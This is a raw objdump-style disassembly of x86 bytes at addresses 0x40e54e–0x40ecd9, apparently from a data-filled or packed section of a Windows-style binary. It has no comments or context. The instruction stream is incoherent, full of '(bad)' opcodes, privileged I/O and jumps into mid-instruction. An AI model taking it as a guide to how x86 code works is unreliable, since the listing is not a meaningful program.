  40e54e:	adc    ah,BYTE PTR [ebx-0x5f]
  40e551:	xor    DWORD PTR [ecx+eiz*1],ecx
  40e554:	popf   
  40e555:	xchg   DWORD PTR [eax+0x453f19fa],edx
  40e55b:	inc    esi
  40e55c:	and    ah,al
  40e55e:	cld    
  40e55f:	jl     0x40e5d0
  40e561:	dec    eax
  40e562:	xchg   esi,eax
  40e563:	(bad)  
  40e564:	and    esi,DWORD PTR [eax+0x18]
  40e567:	push   ebx
  40e568:	sub    BYTE PTR [ecx-0xc],bh
  40e56b:	loope  0x40e55a
  40e56d:	push   edx
  40e56e:	daa    
  40e56f:	pop    ecx
  40e570:	ja     0x40e525
  40e572:	mov    DWORD PTR [edi],edi
  40e574:	in     eax,dx
  40e575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e576:	xlat   BYTE PTR ds:[ebx]
  40e577:	push   edi
  40e578:	ins    DWORD PTR es:[edi],dx
  40e579:	and    edi,DWORD PTR [edx+edx*2]
  40e57c:	shl    BYTE PTR ds:0xdce9363b,0x30
  40e583:	cwde   
  40e584:	fisttp QWORD PTR [ebx+0x70790dee]
  40e58a:	rcr    BYTE PTR [esp+ebx*1],0x5b
  40e58e:	jbe    0x40e5a5
  40e590:	mov    al,0x1
  40e592:	pop    esi
  40e593:	add    BYTE PTR [edx+edx*4-0x6c7f2fd6],dl
  40e59a:	jecxz  0x40e5fb
  40e59c:	clc    
  40e59d:	sub    ecx,DWORD PTR [edi+0xe]
  40e5a0:	fnsave [ecx+eax*2-0x7]
  40e5a4:	ret    
  40e5a5:	(bad)  
  40e5a6:	lds    esi,FWORD PTR [ebx+esi*1-0x141b04b3]
  40e5ad:	(bad)  
  40e5ae:	enter  0x3664,0x5c
  40e5b2:	xchg   BYTE PTR ds:0xaf12e515,cl
  40e5b8:	add    ah,BYTE PTR [esi-0x758a9728]
  40e5be:	jnp    0x40e61d
  40e5c0:	dec    eax
  40e5c1:	into   
  40e5c2:	add    eax,0x995e30ba
  40e5c7:	lods   eax,DWORD PTR ds:[esi]
  40e5c8:	cmp    eax,ecx
  40e5ca:	jl     0x40e5c9
  40e5cc:	push   0xf0beda9e
  40e5d1:	in     al,0x56
  40e5d3:	adc    al,0x21
  40e5d5:	outs   dx,BYTE PTR ds:[esi]
  40e5d6:	ins    BYTE PTR es:[edi],dx
  40e5d7:	dec    ecx
  40e5d8:	inc    edx
  40e5d9:	push   edi
  40e5da:	stc    
  40e5db:	cmc    
  40e5dc:	test   eax,0x1525f022
  40e5e1:	mov    bl,0x31
  40e5e3:	mov    edi,ebp
  40e5e5:	scas   eax,DWORD PTR es:[edi]
  40e5e6:	sub    edx,edx
  40e5e8:	jmp    0x40e60f
  40e5ea:	adc    ebp,ebp
  40e5ec:	rol    BYTE PTR [ebp+0x79442538],cl
  40e5f2:	mov    ds:0xdc469c34,al
  40e5f7:	mov    cl,0x7d
  40e5f9:	push   esp
  40e5fa:	cdq    
  40e5fb:	mov    bh,0xf2
  40e5fd:	xor    BYTE PTR [ebp-0xaf5eed3],al
  40e603:	mov    BYTE PTR [edx+0x6ccb703d],ah
  40e609:	(bad)  
  40e60a:	bound  edx,QWORD PTR [edi]
  40e60c:	arpl   WORD PTR [edx],bx
  40e60e:	sbb    edx,esi
  40e610:	stc    
  40e611:	jg     0x40e691
  40e613:	push   0x27
  40e615:	aam    0xc9
  40e617:	aad    0x89
  40e619:	push   ds
  40e61a:	sti    
  40e61b:	dec    ecx
  40e61c:	outs   dx,BYTE PTR ds:[esi]
  40e61d:	inc    ebx
  40e61e:	or     eax,0x7b7defcd
  40e623:	in     eax,0x36
  40e625:	ror    BYTE PTR [ecx],cl
  40e627:	push   ebx
  40e628:	hlt    
  40e629:	adc    eax,0x36939c1b
  40e62e:	xor    esp,ecx
  40e630:	retf   0x5475
  40e633:	test   ebx,ebx
  40e635:	inc    edx
  40e636:	mov    esp,0xc98e268b
  40e63b:	xchg   edi,eax
  40e63c:	or     al,0x12
  40e63e:	push   ss
  40e63f:	push   0x4c
  40e641:	and    ebp,eax
  40e643:	jmp    0x40e5e6
  40e645:	jg     0x40e60b
  40e647:	(bad)  
  40e648:	in     al,dx
  40e649:	(bad)  
  40e64a:	push   ecx
  40e64b:	out    0xcb,eax
  40e64d:	xor    ebx,edi
  40e64f:	ja     0x40e60b
  40e651:	lds    esp,FWORD PTR [ebx]
  40e653:	pop    ds
  40e654:	cld    
  40e655:	dec    esi
  40e656:	in     al,0xc7
  40e658:	and    DWORD PTR [ebp-0x4e326074],eax
  40e65e:	pop    ecx
  40e65f:	out    dx,al
  40e660:	dec    esi
  40e661:	inc    esi
  40e662:	gs push ax
  40e665:	sub    DWORD PTR [edx-0x20e0de89],0xeeabff7b
  40e66f:	je     0x40e681
  40e671:	aas    
  40e672:	pop    esi
  40e673:	sbb    edx,DWORD PTR [eax]
  40e675:	icebp  
  40e676:	test   al,0x8f
  40e678:	dec    DWORD PTR [ecx+0x70f3bcf7]
  40e67e:	jecxz  0x40e6a2
  40e680:	sub    esi,DWORD PTR ds:[eax+0x7ab91952]
  40e687:	call   0x229e:0x5345c01c
  40e68e:	imul   ecx,DWORD PTR [ecx],0x76
  40e691:	sbb    ecx,DWORD PTR [ecx-0x3d]
  40e694:	or     ebx,edx
  40e696:	loope  0x40e632
  40e698:	sub    esi,0x5292f41
  40e69e:	inc    esp
  40e69f:	test   DWORD PTR [edi+esi*2],0xde44e792
  40e6a6:	mov    eax,0x881a638e
  40e6ab:	xor    BYTE PTR [ebp+0x7585af2d],dl
  40e6b1:	sub    BYTE PTR [edx+eiz*8],0xcc
  40e6b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6b6:	ja     0x40e6f7
  40e6b8:	jns    0x40e671
  40e6ba:	repnz (bad) 
  40e6bd:	pop    ss
  40e6be:	mov    BYTE PTR [ebx],bh
  40e6c0:	clc    
  40e6c1:	scas   al,BYTE PTR es:[edi]
  40e6c2:	push   0x1e
  40e6c4:	stos   BYTE PTR es:[edi],al
  40e6c5:	popf   
  40e6c6:	addr16 retf 
  40e6c8:	and    al,0xe9
  40e6ca:	fwait
  40e6cb:	jne    0x40e66b
  40e6cd:	mov    esp,0xd4b2624a
  40e6d2:	mov    DWORD PTR [eax+0x7f984710],ecx
  40e6d8:	std    
  40e6d9:	mov    ds:0x558cda7c,al
  40e6de:	or     BYTE PTR [eax+0x2d54c590],bh
  40e6e4:	dec    esi
  40e6e5:	adc    eax,0x98fb1fd8
  40e6ea:	sub    al,0x35
  40e6ec:	cmp    BYTE PTR [ebp+0x2f],bl
  40e6ef:	add    al,0x2b
  40e6f1:	test   DWORD PTR [eax],ebp
  40e6f3:	stos   BYTE PTR es:[edi],al
  40e6f4:	adc    eax,0x3afb5e8b
  40e6f9:	jg     0x40e6fc
  40e6fb:	or     DWORD PTR ds:0xfdb247,eax
  40e701:	cmp    eax,eax
  40e703:	mov    ds:0x2d179ff8,eax
  40e708:	(bad)  
  40e709:	jno    0x40e6dc
  40e70b:	loope  0x40e6f0
  40e70d:	in     al,dx
  40e70e:	mov    al,0xe8
  40e710:	sub    ah,bl
  40e712:	mov    ds:0x2eaf5655,eax
  40e717:	add    ch,BYTE PTR [eax-0x473671c9]
  40e71d:	dec    edx
  40e71e:	mov    edi,0xe99baf0b
  40e723:	add    bl,BYTE PTR [esi]
  40e725:	in     al,dx
  40e726:	push   ds
  40e727:	mov    ecx,0xeb48b4d5
  40e72c:	add    BYTE PTR [edx+ebp*4-0x57],dh
  40e730:	push   esp
  40e731:	push   ecx
  40e732:	xchg   edx,esp
  40e734:	xchg   ebp,esi
  40e736:	ficom  DWORD PTR [ebx]
  40e738:	cwde   
  40e739:	call   0x8010256e
  40e73e:	inc    ecx
  40e73f:	scas   eax,DWORD PTR es:[edi]
  40e740:	adc    BYTE PTR [esi+0x71],ch
  40e743:	aas    
  40e744:	js     0x40e79c
  40e746:	pop    ss
  40e747:	mov    bl,0x48
  40e749:	and    ch,BYTE PTR [esi+esi*8]
  40e74c:	jae    0x40e794
  40e74e:	dec    ebx
  40e74f:	adc    ah,0xc0
  40e752:	sub    al,0xa3
  40e754:	mov    al,ds:0x5f9ff7e2
  40e759:	mov    ds:0x9db068de,eax
  40e75e:	mov    ebx,0x3050d936
  40e763:	ss adc eax,edi
  40e766:	pop    ds
  40e767:	ss push ebx
  40e769:	dec    ebp
  40e76a:	ret    0x17af
  40e76d:	push   cs
  40e76e:	fbstp  TBYTE PTR [esi+ecx*2]
  40e771:	add    al,0xe3
  40e773:	xor    eax,DWORD PTR [edx-0x2e]
  40e776:	inc    ecx
  40e777:	rcl    edi,cl
  40e779:	mov    bl,0xa0
  40e77b:	(bad)  
  40e77c:	dec    esp
  40e77d:	mov    ds:0x8724dd15,eax
  40e782:	sub    ebp,DWORD PTR [edi-0x45814b7c]
  40e788:	pop    ecx
  40e789:	(bad)  
  40e78a:	arpl   WORD PTR [ecx-0x30],di
  40e78d:	aad    0x89
  40e78f:	aad    0xdd
  40e791:	push   ebx
  40e792:	out    0x3d,eax
  40e794:	mov    edx,0x73298a5b
  40e799:	ds or  eax,0x2a26f12c
  40e79f:	push   esi
  40e7a0:	inc    edx
  40e7a1:	inc    eax
  40e7a2:	xchg   ebp,eax
  40e7a3:	sub    eax,0x58e4a52a
  40e7a8:	xchg   esi,eax
  40e7a9:	sbb    eax,0x48
  40e7ac:	mov    ebp,0xd26ecb88
  40e7b1:	data16 (bad) 
  40e7b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7b4:	pslld  mm5,QWORD PTR [ebx+0x380ad8e1]
  40e7bb:	and    bh,bl
  40e7bd:	ins    WORD PTR es:[edi],dx
  40e7bf:	out    dx,al
  40e7c0:	jns    0x40e7e2
  40e7c2:	cmp    eax,DWORD PTR [edx+0x4fd7f0b3]
  40e7c8:	mov    cl,BYTE PTR [ebx+0x39e72fe8]
  40e7ce:	pop    ss
  40e7cf:	in     eax,dx
  40e7d0:	es mov bl,0xef
  40e7d3:	add    al,0xfa
  40e7d5:	or     edi,DWORD PTR [esi+esi*8-0x19]
  40e7d9:	ss cwde 
  40e7db:	fsub   QWORD PTR [eax+ebp*8+0x4f345316]
  40e7e2:	push   eax
  40e7e3:	and    al,0xfa
  40e7e5:	and    BYTE PTR [ecx+0x6b79c11],0x29
  40e7ec:	outs   dx,BYTE PTR ds:[esi]
  40e7ed:	test   eax,0xd9da18f2
  40e7f2:	mov    al,ds:0x45860c6a
  40e7f7:	inc    ebp
  40e7f8:	test   BYTE PTR [edi-0xba7ec85],dl
  40e7fe:	cmc    
  40e7ff:	js     0x40e833
  40e801:	outs   dx,DWORD PTR ds:[esi]
  40e802:	add    ah,dh
  40e804:	push   0x29
  40e806:	data16 mov dl,0x4f
  40e809:	pop    ss
  40e80a:	sbb    edx,0xffffffbd
  40e80d:	repnz das 
  40e80f:	lahf   
  40e810:	(bad)  
  40e811:	jo     0x40e849
  40e813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e814:	(bad)  
  40e815:	sbb    edi,edi
  40e817:	mov    ds:0x670dc3b4,al
  40e81c:	loop   0x40e881
  40e81e:	int    0x2d
  40e820:	dec    esi
  40e821:	jne    0x40e88e
  40e823:	xchg   esp,eax
  40e824:	sahf   
  40e825:	push   ebp
  40e826:	mov    cs,WORD PTR [ebx+eiz*8+0x25fba3dd]
  40e82d:	mov    bh,0x6d
  40e82f:	call   0xc61:0x490bb3a1
  40e836:	xchg   edx,eax
  40e837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e838:	sub    DWORD PTR [ebx+0x49],0xffffffda
  40e83c:	jns    0x40e809
  40e83e:	aaa    
  40e83f:	daa    
  40e840:	sbb    dh,BYTE PTR [ecx+esi*4]
  40e843:	das    
  40e844:	inc    esi
  40e845:	and    bl,bl
  40e847:	sub    ebx,DWORD PTR [eax+ebx*8-0x4e]
  40e84b:	bound  ebx,QWORD PTR [ecx]
  40e84d:	mov    dl,0xea
  40e84f:	adc    BYTE PTR [edx],0xc0
  40e852:	sets   BYTE PTR ds:0xe6442bee
  40e859:	daa    
  40e85a:	jns    0x40e840
  40e85c:	inc    edi
  40e85d:	js     0x40e879
  40e85f:	and    DWORD PTR [esi-0x2b],ebp
  40e862:	adc    eax,0x10a4ae59
  40e867:	call   0x8d6604e3
  40e86c:	cld    
  40e86d:	je     0x40e892
  40e86f:	(bad)  
  40e870:	in     eax,dx
  40e871:	scas   al,BYTE PTR es:[edi]
  40e872:	mov    dl,0xaf
  40e874:	call   DWORD PTR [ecx]
  40e876:	(bad)
  40e879:	xor    DWORD PTR [edi-0x34],0xffffffe6
  40e87d:	push   ebp
  40e87e:	pop    ds
  40e87f:	mov    bl,bl
  40e881:	mov    ebp,0xa8e76e81
  40e886:	fdivr  QWORD PTR [edx-0x4a222d39]
  40e88c:	and    ecx,DWORD PTR [esi]
  40e88e:	in     eax,0x9e
  40e890:	call   0xd446973e
  40e895:	cmc    
  40e896:	jno    0x40e8fc
  40e898:	outs   dx,DWORD PTR ds:[esi]
  40e899:	fwait
  40e89a:	stc    
  40e89b:	xlat   BYTE PTR ds:[ebx]
  40e89c:	inc    edx
  40e89d:	cmp    ebp,ebp
  40e89f:	ds dec ecx
  40e8a1:	push   eax
  40e8a2:	int3   
  40e8a3:	and    BYTE PTR [esi],cl
  40e8a5:	icebp  
  40e8a6:	loopne 0x40e913
  40e8a8:	enter  0xf083,0x2f
  40e8ac:	pop    eax
  40e8ad:	sbb    BYTE PTR [esi-0x75584d06],al
  40e8b3:	mov    eax,ds:0x2493928
  40e8b8:	ficom  WORD PTR [ebp-0x7250aef6]
  40e8be:	leave  
  40e8bf:	stos   DWORD PTR es:[edi],eax
  40e8c0:	in     al,dx
  40e8c1:	int3   
  40e8c2:	xor    cl,BYTE PTR [eax]
  40e8c4:	xor    DWORD PTR [edx],ecx
  40e8c6:	rol    BYTE PTR [ebx-0x37],cl
  40e8c9:	pushf  
  40e8ca:	ja     0x40e913
  40e8cc:	aad    0xf3
  40e8ce:	fwait
  40e8cf:	mov    bh,0x70
  40e8d1:	mov    ah,0xef
  40e8d3:	dec    ecx
  40e8d4:	xchg   esp,eax
  40e8d5:	mov    al,0xef
  40e8d7:	jge    0x40e93e
  40e8d9:	and    ebx,DWORD PTR [esi-0x38]
  40e8dc:	jne    0x40e874
  40e8de:	pop    ebp
  40e8df:	cmp    dh,BYTE PTR [esi+ebp*1+0x3d]
  40e8e3:	sub    ah,BYTE PTR [ebx-0x69]
  40e8e6:	not    BYTE PTR [esi]
  40e8e8:	aam    0xd0
  40e8ea:	push   0x10
  40e8ec:	or     ch,ah
  40e8ee:	(bad)  
  40e8ef:	repz rol bl,1
  40e8f2:	jne    0x40e874
  40e8f4:	jmp    0x400a:0x69717222
  40e8fb:	mov    ch,0x71
  40e8fd:	dec    ecx
  40e8fe:	dec    esi
  40e8ff:	cmp    BYTE PTR [ecx-0x13],ch
  40e902:	fnstenv [ebx-0x3]
  40e905:	jmp    0xb46b4231
  40e90a:	fmul   st(3),st
  40e90c:	jb     0x40e93e
  40e90e:	mov    BYTE PTR [edi+0x54],bh
  40e911:	mov    ds:0x10138beb,al
  40e916:	add    al,0x43
  40e918:	sar    cl,0x8
  40e91b:	mov    eax,ds:0xc68e98e0
  40e920:	je     0x40e99c
  40e922:	mov    ch,0xd4
  40e924:	mov    al,0x7f
  40e926:	push   eax
  40e927:	stos   DWORD PTR es:[edi],eax
  40e928:	dec    esp
  40e929:	jno    0x40e99e
  40e92b:	cmp    BYTE PTR [ecx],bl
  40e92d:	sub    al,dl
  40e92f:	cld    
  40e930:	push   esi
  40e931:	mov    ebx,0x4f26e266
  40e936:	outs   dx,DWORD PTR ds:[esi]
  40e937:	call   0x1106:0xe2b64929
  40e93e:	clc    
  40e93f:	or     esi,ecx
  40e941:	mov    edx,0xf73d9ef3
  40e946:	es inc edi
  40e948:	jl     0x40e9c3
  40e94a:	add    ebx,ecx
  40e94c:	stc    
  40e94d:	cdq    
  40e94e:	push   ebp
  40e94f:	mov    ds:0xfa35b0e5,al
  40e954:	jo     0x40e8f6
  40e956:	test   al,0x22
  40e958:	test   bl,ch
  40e95a:	test   DWORD PTR [eax+0x1a],0xd00265f8
  40e961:	ins    BYTE PTR es:[edi],dx
  40e962:	jo     0x40e9ce
  40e964:	les    ebx,FWORD PTR [ecx+0x6e]
  40e967:	outs   dx,DWORD PTR ds:[esi]
  40e968:	fnsave [ecx+0x3bea4cda]
  40e96e:	pushf  
  40e96f:	call   0xb306327
  40e974:	dec    edi
  40e975:	out    dx,al
  40e976:	sub    al,0xf9
  40e978:	and    bh,cl
  40e97a:	push   0x5d
  40e97c:	xchg   ebx,eax
  40e97d:	(bad)  
  40e97e:	sub    eax,0xd7f718a0
  40e983:	popf   
  40e984:	(bad)  
  40e985:	imul   esp,DWORD PTR [ebp+0x1d],0x3b
  40e989:	cmp    edx,ebx
  40e98b:	lods   al,BYTE PTR ds:[esi]
  40e98c:	(bad)  
  40e98d:	cs xchg edx,eax
  40e98f:	lods   al,BYTE PTR ds:[esi]
  40e990:	(bad)
  40e993:	aad    0xfc
  40e995:	test   eax,0x42311c39
  40e99a:	cmp    BYTE PTR [esi],0x1e
  40e99d:	cmp    ch,BYTE PTR [esp+eiz*4+0x3d]
  40e9a1:	mov    cl,0xc2
  40e9a3:	lahf   
  40e9a4:	fist   WORD PTR [edi+edi*1-0x3e]
  40e9a8:	sub    BYTE PTR [esi],bl
  40e9aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9ab:	mov    bl,0xc7
  40e9ad:	frstor [ebp-0x9]
  40e9b0:	fdiv   QWORD PTR [ecx+0x170f4446]
  40e9b6:	test   al,0x3a
  40e9b8:	icebp  
  40e9b9:	xchg   ebp,eax
  40e9ba:	or     BYTE PTR [esp+ecx*2+0x6427f1b2],dh
  40e9c1:	lods   eax,DWORD PTR ds:[esi]
  40e9c2:	pop    ss
  40e9c3:	sub    DWORD PTR [ebp-0x25c65450],ebx
  40e9c9:	and    al,0x20
  40e9cb:	push   esp
  40e9cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9cd:	jle    0x40ea31
  40e9cf:	cld    
  40e9d0:	in     eax,dx
  40e9d1:	dec    ebp
  40e9d2:	ins    DWORD PTR es:[edi],dx
  40e9d3:	mov    esp,0x3dfbbae9
  40e9d8:	data16 das 
  40e9da:	aad    0x4e
  40e9dc:	xchg   BYTE PTR [esi],dh
  40e9de:	test   DWORD PTR [ecx-0x39],ecx
  40e9e1:	mov    ds:0x78cebbae,al
  40e9e6:	and    ecx,DWORD PTR [ebx]
  40e9e8:	push   ebx
  40e9e9:	sti    
  40e9ea:	inc    ecx
  40e9eb:	jl     0x40ea11
  40e9ed:	inc    eax
  40e9ee:	pop    es
  40e9ef:	cmp    al,0x4b
  40e9f1:	das    
  40e9f2:	ret    
  40e9f3:	xor    DWORD PTR [eax+ebp*2-0xaf15867],0xffffff90
  40e9fb:	or     al,0xf3
  40e9fd:	ret    
  40e9fe:	sub    ebx,edi
  40ea00:	fdiv   DWORD PTR [edx+0x2b2d2bb5]
  40ea06:	adc    al,0x46
  40ea08:	jge    0x40ea88
  40ea0a:	mov    dh,0xb
  40ea0c:	mov    ds:0x70bb07c7,eax
  40ea11:	lods   eax,DWORD PTR ds:[esi]
  40ea12:	mov    ecx,DWORD PTR [edx+esi*1-0x57757d0]
  40ea19:	and    eax,DWORD PTR [edx-0x6d7fe945]
  40ea1f:	loop   0x40e9b7
  40ea21:	ret    
  40ea22:	shl    BYTE PTR [ecx+0x7dd4a8b2],0x0
  40ea29:	mov    ds:0xc231d262,al
  40ea2e:	pop    ss
  40ea2f:	shl    bh,cl
  40ea31:	sar    BYTE PTR [edi+0x3],cl
  40ea34:	loop   0x40e9de
  40ea36:	mov    al,0x4b
  40ea38:	and    eax,0x1bb6532f
  40ea3d:	adc    BYTE PTR [esi+0x7e405efb],cl
  40ea43:	mov    ch,0x27
  40ea45:	xchg   ecx,esi
  40ea47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea48:	loopne 0x40ea3a
  40ea4a:	addr16 fwait
  40ea4c:	das    
  40ea4d:	adc    BYTE PTR [ebx-0x3e14b484],ah
  40ea53:	and    eax,0xc53856c7
  40ea58:	or     BYTE PTR [ebp+0x658590c7],bl
  40ea5e:	lock adc ch,ch
  40ea61:	push   ecx
  40ea62:	mov    DWORD PTR [edi-0x2e1c0837],edx
  40ea68:	rcl    BYTE PTR [ebx*4+0x1c643a81],cl
  40ea6f:	xor    esi,DWORD PTR [edx]
  40ea71:	mov    bh,0x92
  40ea73:	add    DWORD PTR [esi-0x61],esp
  40ea76:	add    BYTE PTR [ebp-0x65],0x99
  40ea7a:	xchg   esp,eax
  40ea7b:	push   0x19
  40ea7d:	jl     0x40ea8b
  40ea7f:	or     eax,0xba495101
  40ea84:	jmp    0x98c8:0xd8b69d3
  40ea8b:	adc    edi,0xf
  40ea8e:	lock lds ebp,FWORD PTR [edx]
  40ea91:	leave  
  40ea92:	into   
  40ea93:	or     DWORD PTR [ebx+0x3c],0xf9c8bee5
  40ea9a:	ss jno 0x40ea6b
  40ea9d:	sar    DWORD PTR [ecx+0x597a5711],0xa1
  40eaa4:	aaa    
  40eaa5:	sbb    al,bh
  40eaa7:	(bad)  
  40eaa8:	ds lock add ebp,esi
  40eaac:	stos   BYTE PTR es:[edi],al
  40eaad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaae:	fmul   QWORD PTR [ebp+eax*4-0x12]
  40eab3:	sbb    al,0x40
  40eab5:	imul   ebx,ebp,0x5e
  40eab8:	sub    DWORD PTR [ecx-0x479100a8],0xffffffde
  40eabf:	xor    DWORD PTR [eax+0x28],esi
  40eac2:	aad    0xbe
  40eac4:	mov    eax,ds:0xa45022de
  40eac9:	dec    esp
  40eaca:	test   BYTE PTR [bp+si+0xdd5],ch
  40eacf:	and    BYTE PTR [edi+0x8569a8f],dh
  40ead5:	or     DWORD PTR [ebx+0x9343152],ecx
  40eadb:	lods   eax,DWORD PTR ds:[esi]
  40eadc:	in     al,0xc5
  40eade:	mov    eax,DWORD PTR [ebx+0x7e9a0346]
  40eae4:	mov    bh,0x59
  40eae6:	psubsw mm1,QWORD PTR [ebx+0x7f8ee0fb]
  40eaed:	shr    BYTE PTR [eax],cl
  40eaef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaf0:	fisttp DWORD PTR [ebp-0x76]
  40eaf3:	cmp    al,0xe5
  40eaf5:	iret   
  40eaf6:	add    ebx,esp
  40eaf8:	inc    ebp
  40eaf9:	sbb    DWORD PTR [edi],0x422161a8
  40eaff:	dec    edx
  40eb00:	mov    cl,0x71
  40eb02:	jns    0x40eb12
  40eb04:	popa   
  40eb05:	fadd   QWORD PTR [ebp+0xf8fa967]
  40eb0b:	mov    BYTE PTR [eax+0xc406a3],dh
  40eb11:	jge    0x40eaec
  40eb13:	pop    eax
  40eb14:	push   ss
  40eb15:	mov    BYTE PTR [ecx],ch
  40eb17:	lock inc eax
  40eb19:	pop    esp
  40eb1a:	test   esi,edx
  40eb1c:	cdq    
  40eb1d:	cld    
  40eb1e:	sbb    ah,BYTE PTR [ebx+0x4250ec9c]
  40eb24:	lahf   
  40eb25:	fcomp  st(7)
  40eb27:	mov    WORD PTR [esp+esi*2+0x11dc91f8],?
  40eb2e:	test   al,0xfb
  40eb30:	jns    0x40eb9d
  40eb32:	push   DWORD PTR [ebp+0x51163bdd]
  40eb38:	jo     0x40eaf6
  40eb3a:	push   edi
  40eb3b:	pop    ss
  40eb3c:	inc    edi
  40eb3d:	adc    edx,DWORD PTR [edi+eax*8-0x4a]
  40eb41:	rcr    BYTE PTR [ebx],0x82
  40eb44:	mov    eax,ds:0xd5021a92
  40eb49:	nop
  40eb4a:	or     esi,DWORD PTR [edx-0x4dff211c]
  40eb50:	jmp    0x335a:0xa3b04c56
  40eb57:	inc    esi
  40eb58:	dec    eax
  40eb59:	pop    esi
  40eb5a:	xor    ah,BYTE PTR [eax]
  40eb5c:	stc    
  40eb5d:	sub    dh,dl
  40eb5f:	pop    ebp
  40eb60:	push   eax
  40eb61:	call   0x3061:0x3e7225f7
  40eb68:	lahf   
  40eb69:	xchg   DWORD PTR [edx+0x20],edx
  40eb6c:	sub    eax,0x381a01bf
  40eb71:	mov    ds:0x6d4eca2e,eax
  40eb76:	leave  
  40eb77:	inc    ecx
  40eb78:	les    ebx,FWORD PTR [ebx-0xfc25ecf]
  40eb7e:	xor    BYTE PTR [ebp+0x6de3461b],ah
  40eb84:	jo     0x40eb47
  40eb86:	hlt    
  40eb87:	mov    bh,0xf
  40eb89:	mov    ebx,0x7298636
  40eb8e:	imul   ebx,DWORD PTR [ecx],0x92101d33
  40eb94:	jno    0x40eb5f
  40eb96:	adc    esp,DWORD PTR [eax+ebx*8-0x5b]
  40eb9a:	cdq    
  40eb9b:	push   ebp
  40eb9c:	pop    ds
  40eb9d:	mov    edi,0x413575f5
  40eba2:	das    
  40eba3:	ss jae 0x40eb72
  40eba6:	inc    ecx
  40eba7:	and    ch,BYTE PTR [edx]
  40eba9:	icebp  
  40ebaa:	rol    DWORD PTR fs:[esi+0x5efbde08],cl
  40ebb1:	pop    ebx
  40ebb2:	scas   al,BYTE PTR es:[edi]
  40ebb3:	loop   0x40ebf2
  40ebb5:	add    ebx,0xbc49932e
  40ebbb:	(bad)  
  40ebbc:	xor    BYTE PTR [ecx-0x42],ch
  40ebbf:	jb     0x40eb58
  40ebc1:	fwait
  40ebc2:	call   0xf5aa6ca8
  40ebc7:	test   al,0xfe
  40ebc9:	xor    al,0xef
  40ebcb:	adc    bl,BYTE PTR [edx]
  40ebcd:	loop   0x40ec33
  40ebcf:	out    dx,al
  40ebd0:	and    DWORD PTR [ebx+eax*1],eax
  40ebd3:	or     eax,0x61a7f10b
  40ebd8:	add    al,0x27
  40ebda:	mov    ecx,0x94c36519
  40ebdf:	push   ss
  40ebe0:	fsub   DWORD PTR [eax+0x62]
  40ebe3:	cmp    bl,al
  40ebe5:	mov    ecx,0xee0917b3
  40ebea:	adc    eax,0x214746e
  40ebef:	xor    dl,BYTE PTR [edi-0x1852373d]
  40ebf5:	daa    
  40ebf6:	push   cs
  40ebf7:	jle    0x40eb97
  40ebf9:	dec    eax
  40ebfa:	leave  
  40ebfb:	dec    edi
  40ebfc:	in     al,dx
  40ebfd:	sub    eax,DWORD PTR [eax]
  40ebff:	jnp    0x40ec07
  40ec01:	test   eax,0x80a73c4e
  40ec06:	jne    0x40ebfe
  40ec08:	lock mov eax,ds:0xe29f4b2a
  40ec0e:	dec    eax
  40ec0f:	cmp    BYTE PTR [ecx-0x76],dl
  40ec12:	out    0x27,al
  40ec14:	fcomp  DWORD PTR [ebx+eiz*8]
  40ec17:	or     BYTE PTR [eax],ah
  40ec19:	enter  0xbecd,0xa
  40ec1d:	pop    es
  40ec1e:	enter  0xec7b,0xc7
  40ec22:	rcl    ebx,0x6a
  40ec25:	(bad)  [esi*4+0x317ad6a]
  40ec2c:	push   0x8bcb254d
  40ec31:	das    
  40ec32:	loopne 0x40ec84
  40ec34:	mov    edi,0x29fc07b0
  40ec39:	sbb    dl,dh
  40ec3b:	mov    ebx,0xc8ebfca4
  40ec40:	sbb    ebx,esi
  40ec42:	scas   eax,DWORD PTR es:[edi]
  40ec43:	mov    al,0xe4
  40ec45:	enter  0x1206,0xd9
  40ec49:	pop    es
  40ec4a:	mov    dl,0xb1
  40ec4c:	out    dx,eax
  40ec4d:	addr16 cs or eax,0x1008ea21
  40ec54:	rcpps  xmm0,XMMWORD PTR [eax+eax*4-0x3b]
  40ec59:	ficom  DWORD PTR cs:[esi-0x6f]
  40ec5d:	in     al,0x1c
  40ec5f:	add    dl,dl
  40ec61:	mov    cl,BYTE PTR [eax]
  40ec63:	adc    DWORD PTR [esi-0x6c0f5342],esp
  40ec69:	push   0xdd83e493
  40ec6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec6f:	popa   
  40ec70:	cmp    eax,0x45be086
  40ec75:	imul   ebx,esp,0x227bc0a0
  40ec7b:	mov    eax,0xd9712bae
  40ec80:	je     0x40ecec
  40ec82:	sub    esp,ebx
  40ec84:	mov    bh,0x84
  40ec86:	cdq    
  40ec87:	adc    ecx,edi
  40ec89:	addr16 cld 
  40ec8b:	xchg   ecx,eax
  40ec8c:	jo     0x40ecd1
  40ec8e:	mov    edx,0x8ccf4f6c
  40ec93:	mov    cl,0x13
  40ec96:	jl     0x40ed00
  40ec98:	adc    al,0xcb
  40ec9a:	loopne 0x40ecf9
  40ec9c:	mov    ds:0xe22d520c,eax
  40eca1:	sub    DWORD PTR [ecx],ebx
  40eca3:	lock xchg esp,eax
  40eca5:	pop    esi
  40eca6:	push   ds
  40eca7:	hlt    
  40eca8:	xor    al,0xb7
  40ecaa:	or     DWORD PTR [edx-0x16],edi
  40ecad:	push   es
  40ecae:	mov    ds:0x4c7e6f11,al
  40ecb3:	popf   
  40ecb4:	fst    st(1)
  40ecb6:	idiv   ebx
  40ecb8:	xor    eax,0x75
  40ecbb:	inc    edi
  40ecbc:	mov    al,0xbf
  40ecbe:	jns    0x40ec6b
  40ecc0:	fild   WORD PTR [ebx]
  40ecc2:	cmp    al,BYTE PTR [eax]
  40ecc4:	pushf  
  40ecc5:	je     0x40ecec
  40ecc7:	cmp    edi,ebp
  40ecc9:	push   edi
  40ecca:	cwde   
  40eccb:	and    al,0x8c
  40eccd:	mov    esp,0x1084579e
  40ecd2:	repnz test BYTE PTR [edi+0x74feff36],cl
  40ecd9:	mov    esp,0xea0f7d28
